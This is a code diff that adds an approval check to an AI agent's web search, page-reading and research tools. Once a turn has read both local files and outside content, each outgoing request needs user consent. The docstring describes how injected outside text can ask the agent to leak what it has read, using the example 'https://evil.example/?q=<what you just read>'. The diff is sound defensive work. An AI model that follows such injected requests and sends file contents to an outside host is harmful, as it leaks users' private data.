@@ -7,10 +7,47 @@ from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 
 import config
+import logbook
+import state
 import webpage
 import websearch
 
 from . import tool
+
+
+def _may_send(action, where):
+    """A search or a fetch sends words out of the house: the query, the
+    URL. Normally that's the point. But once a turn has both read your
+    files and taken in someone else's text (a page, an MCP result), that
+    text can ask for "https://evil.example/?q=<what you just read>" -
+    so from then on, each one asks first. Neither alone asks: plain
+    research, or plain file reading, never sees this popup."""
+    seen = getattr(state.untrusted, "seen", None)
+
+    if not seen or not getattr(state.untrusted, "read_local", False):
+        return True
+
+    import ui
+
+    lines = [f"{action}: {where[:400]}",
+             f"This turn has read your files and outside content ({seen}).",
+             "Say no if you didn't ask for this."]
+    approver = getattr(state.remote, "approver", None)
+
+    if approver is not None:
+        ok = bool(approver("web", f"{action} {where[:200]}", lines, True))
+    else:
+        ok = bool(ui.ask_approval(title=f"{action} {where[:120]}",
+                                  note="Outside content plus your files in one turn",
+                                  body=lines, timeout=config.FILES_APPROVAL_TIMEOUT))
+
+    if not ok:
+        logbook.info("web", "%s %s - not allowed (turn read files and %s)", action, where[:200], seen)
+
+    return ok
+
+
+_NOT_ALLOWED = "The user didn't allow that - nothing was sent. Don't retry."
 
 
 @tool(
@@ -30,6 +67,9 @@ from . import tool
     required=("query",),
 )
 def _web_search(query):
+    if not _may_send("search the web for", str(query)):
+        return _NOT_ALLOWED
+
     results = websearch.search(query)
 
     if not results:
@@ -79,6 +119,9 @@ def _web_search(query):
     why=lambda: 'page reading is off - set web_search.fetch_pages true',
 )
 def _read_page(url, looking_for=None):
+    if not _may_send("open", str(url)):
+        return _NOT_ALLOWED
+
     text, detail = webpage.fetch(url, looking_for=looking_for)
 
     if text is None:
@@ -118,6 +161,9 @@ def _host(url):
     why=lambda: 'page reading is off - set web_search.fetch_pages true',
 )
 def _research(question):
+    if not _may_send("research", str(question)):
+        return _NOT_ALLOWED
+
     want = max(1, int(config.RESEARCH_PAGES))
     results = websearch.search(question, max_results=want + 3)
 
